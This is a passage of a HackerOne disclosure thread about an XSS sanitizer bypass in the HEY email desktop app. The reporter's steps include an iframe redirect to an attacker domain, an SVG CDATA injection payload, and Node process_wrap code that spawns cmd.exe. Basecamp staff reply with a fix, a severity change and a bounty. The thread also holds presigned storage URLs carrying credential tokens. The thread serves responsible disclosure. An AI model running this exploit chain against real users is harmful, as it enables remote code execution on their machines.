class=\"nx\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eproc\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003espawn\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"na\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ecmd.exe\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"na\"\u003eargs\u003c/span\u003e\u003cspan class=\"p\"\u003e:[\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/k calc\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\u003cspan class=\"na\"\u003ecwd\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"na\"\u003ewindowsVerbatimArguments\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"na\"\u003edetached\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"na\"\u003eenvPairs\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv_\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"na\"\u003estdio\u003c/span\u003e\u003cspan class=\"p\"\u003e:[{\u003c/span\u003e\u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eignore\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e},{\u003c/span\u003e\u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eignore\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e},{\u003c/span\u003e\u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eignore\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e}]});}\u003c/span\u003e\n \u003cspan class=\"nx\"\u003e__SENTRY__\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehub\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erun\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"to-reproduce-this\"\u003eto reproduce this:\u003c/h2\u003e\n\n\u003cp\u003e1- create \u003ccode\u003elocalhost-or-[first-domain]/redirect.html\u003c/code\u003e like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;script\u0026gt;\n\n  if (window.top != window.self) {\n    window.top.location = \u0026quot;https://[your-other-domain]attacker.com/RCE.html\u0026quot;;\n\n\n  }\n  \u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e2- on the other domain create RCE.html and put :\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nb\"\u003eObject\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eprototype\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etoString\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecall\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eProcess\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebinding\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eprocess_wrap\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eProcess\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eproc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eProcess\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eproc\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonexit\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{};\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eenv\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eenv_\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[];\u003c/span\u003e\n\u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ekey\u003c/span\u003e \u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nx\"\u003eenv_\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eproc\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003espawn\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"na\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ecmd.exe\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"na\"\u003eargs\u003c/span\u003e\u003cspan class=\"p\"\u003e:[\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/k calc\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\u003cspan class=\"na\"\u003ecwd\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"na\"\u003ewindowsVerbatimArguments\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"na\"\u003edetached\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"na\"\u003eenvPairs\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv_\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"na\"\u003estdio\u003c/span\u003e\u003cspan class=\"p\"\u003e:[{\u003c/span\u003e\u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eignore\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e},{\u003c/span\u003e\u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eignore\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e},{\u003c/span\u003e\u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eignore\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e}]});}\u003c/span\u003e\n \u003cspan class=\"nx\"\u003e__SENTRY__\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehub\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erun\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e3- go to your first hey.com account and make a new message using this payload as the content and send it to another hey email that you own so you can verify the bug, use burpsuite to  intercept and inject the payload or using chrome right click and inspect to inject it in to the \u003ccode\u003e\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;message[content]\u0026quot; id=\u0026quot;message_content__trix_input_message\u0026quot; value=\u0026#39;[payload-inject-here]\u0026#39;\u0026gt;\u003c/code\u003e directly:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;svg\u0026gt;\u0026lt;![CDATA[\u0026gt;\u0026lt;table background=\u0026quot;]])\u0026gt;\u0026quot;\u0026gt;\u0026lt;/svg\u0026gt;\n\u0026lt;svg\u0026gt;\u0026lt;![CDATA[\u0026gt;\u0026lt;iframe src=\u0026quot;//localhost-or-[first-domain]/redirect.html\u0026quot; sandbox=\u0026quot;allow-top-navigation allow-same-origin allow-scripts allow-popups allow-modals allow-forms allow-presentation allow-popups-to-escape-sandbox\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;svg\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNote: the \u003ccode\u003eiframe src\u003c/code\u003e should accept \u003ccode\u003ehttps\u003c/code\u003e requests . \u003c/p\u003e\n\n\u003cp\u003e4- using the windows app login to the second account and click on the new message to view it \u003cbr\u003e\nif it worked you will see the \u003ccode\u003ecalc\u003c/code\u003e app popup\u003c/p\u003e\n\n\u003cp\u003ewhile I haven\u0026#39;t test the mac and Linux apps if they are using electron js they are vulnerable too let me know if i should test them too.\u003cbr\u003e\nNote: this payload will not execute on the attackers account, only on the victims so to verify it you need to make 2 accounts.\u003c/p\u003e\n\n\u003cp\u003ean attacker can exploit this in a large scale and in a way that a victim will never notice that his machine was hacked .\u003c/p\u003e\n\n\u003cp\u003elet me know if you need more info.\u003cbr\u003e\nRegards.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-11T16:09:38.775Z","updated_at":"2020-10-11T16:09:38.775Z","actor":{"username":"carbon61","cleared":false,"url":"/carbon61","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9514888,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @carbon61,\n\nThanks for the report!\n\nWe deployed a fix for this that escapes CDATA inside `\u003csvg\u003e` tags. I need to do a bit more investigation to decide on a bounty—I’ll get back to you soon.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/carbon61\"\u003e@carbon61\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks for the report!\u003c/p\u003e\n\n\u003cp\u003eWe deployed a fix for this that escapes CDATA inside \u003ccode\u003e\u0026lt;svg\u0026gt;\u003c/code\u003e tags. I need to do a bit more investigation to decide on a bounty—I’ll get back to you soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-13T23:55:31.669Z","updated_at":"2020-10-13T23:55:43.929Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9530183,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"markdown_message":"","automated_response":false,"created_at":"2020-10-15T12:53:05.210Z","updated_at":"2020-10-15T12:53:05.210Z","additional_data":{"old_severity":"High (8.2)","new_severity":"Medium","old_severity_id":853262,"new_severity_id":877606},"actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9530224,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We couldn’t reproduce this exactly as described. The `\u003ciframe\u003e` loads and attempts to redirect but the redirect URL is always opened in a separate browser window, not the HEY app. Note that we hosted the original `\u003ciframe\u003e` `src` on a separate domain; it may be that this attack only works when it’s hosted on `localhost`, which is difficult to exploit.\n\nHowever, we discussed this as a team and decided to treat sanitizer bypasses as eligible vulnerabilities separate from CSP bypasses. In other words, this vulnerability is eligible for bounty as originally reported. HEY’s HTML sanitization and CSP are two separate defenses against XSS; we're interested in breaches of either defense even when they're caught by the other. (This is a reversal of what we said before, that we don't consider sanitizer bypasses vulnerabilities or eligible for bounty.)\n\nWe're awarding this on the high end of the medium tier, as a global XSS in HTML sanitization mitigated by CSP. Thanks again for your report!","markdown_message":"\u003cp\u003eWe couldn’t reproduce this exactly as described. The \u003ccode\u003e\u0026lt;iframe\u0026gt;\u003c/code\u003e loads and attempts to redirect but the redirect URL is always opened in a separate browser window, not the HEY app. Note that we hosted the original \u003ccode\u003e\u0026lt;iframe\u0026gt;\u003c/code\u003e \u003ccode\u003esrc\u003c/code\u003e on a separate domain; it may be that this attack only works when it’s hosted on \u003ccode\u003elocalhost\u003c/code\u003e, which is difficult to exploit.\u003c/p\u003e\n\n\u003cp\u003eHowever, we discussed this as a team and decided to treat sanitizer bypasses as eligible vulnerabilities separate from CSP bypasses. In other words, this vulnerability is eligible for bounty as originally reported. HEY’s HTML sanitization and CSP are two separate defenses against XSS; we\u0026#39;re interested in breaches of either defense even when they\u0026#39;re caught by the other. (This is a reversal of what we said before, that we don\u0026#39;t consider sanitizer bypasses vulnerabilities or eligible for bounty.)\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;re awarding this on the high end of the medium tier, as a global XSS in HTML sanitization mitigated by CSP. Thanks again for your report!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-15T12:56:50.477Z","updated_at":"2020-10-15T12:56:50.477Z","actor":{"url":"/basecamp","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Basecamp"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"basecamp","collaborator":{"username":"carbon61","url":"/carbon61"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9530236,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-15T12:57:43.664Z","updated_at":"2020-10-15T12:57:43.664Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9531270,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @georgeclaghorn,\n\nI can give you the user and password for my hey email to test it your self , i was able to reproduce it even without localhost ,\n\nlet me know if i should make i new POC that you can reproduce \n\n ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/georgeclaghorn\"\u003e@georgeclaghorn\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI can give you the user and password for my hey email to test it your self , i was able to reproduce it even without localhost ,\u003c/p\u003e\n\n\u003cp\u003elet me know if i should make i new POC that you can reproduce \u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-15T14:27:20.409Z","updated_at":"2020-10-15T14:39:23.200Z","actor":{"username":"carbon61","cleared":false,"url":"/carbon61","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9531393,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"this is poc video:\n{F1037337}","markdown_message":"\u003cp\u003ethis is poc video:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"2020-10-15-17-30-27.mp4\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uZGPsBYML8nuMiaDWY1p1xZj?response-content-disposition=attachment%3B%20filename%3D%222020-10-15-17-30-27.mp4%22%3B%20filename%2A%3DUTF-8%27%272020-10-15-17-30-27.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T071820Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=2ba07d6b97bed716b4b7af1c33215d4001f3f632bff15d8a7e6da0a7da4e3403\" data-attachment-type=\"video/mp4\"\u003e\u003cvideo controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uZGPsBYML8nuMiaDWY1p1xZj?response-content-disposition=attachment%3B%20filename%3D%222020-10-15-17-30-27.mp4%22%3B%20filename%2A%3DUTF-8%27%272020-10-15-17-30-27.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T071820Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=2ba07d6b97bed716b4b7af1c33215d4001f3f632bff15d8a7e6da0a7da4e3403\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-15T14:36:34.341Z","updated_at":"2020-10-15T14:36:34.341Z","actor":{"username":"carbon61","cleared":false,"url":"/carbon61","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":1037337,"filename":"2020-10-15-17-30-27.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uZGPsBYML8nuMiaDWY1p1xZj?response-content-disposition=attachment%3B%20filename%3D%222020-10-15-17-30-27.mp4%22%3B%20filename%2A%3DUTF-8%27%272020-10-15-17-30-27.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T071820Z\u0026X-Amz-E